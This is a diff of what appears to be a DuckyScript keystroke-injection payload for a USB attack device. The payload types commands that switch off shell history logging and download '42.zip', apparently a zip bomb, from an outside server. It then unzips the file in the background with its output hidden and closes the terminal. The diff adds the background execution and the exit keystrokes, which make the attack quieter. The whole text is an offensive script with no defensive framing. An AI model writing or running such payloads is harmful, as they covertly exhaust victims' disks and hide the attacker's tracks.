@@ -6,6 +6,12 @@ DELAY 1500
 STRING set +o history
 DELAY 300
 ENTER
-STRING wget https://www.lostserver.com/static/42.zip && unzip 42.zip
+STRING nohup wget https://www.lostserver.com/static/42.zip  &&  unzip 42.zip >/dev/null &
 DELAY 300
+ENTER
+DELAY 500
+CTRL C
+DELAY 300
+STRING exit
+DELAY 200
 ENTER
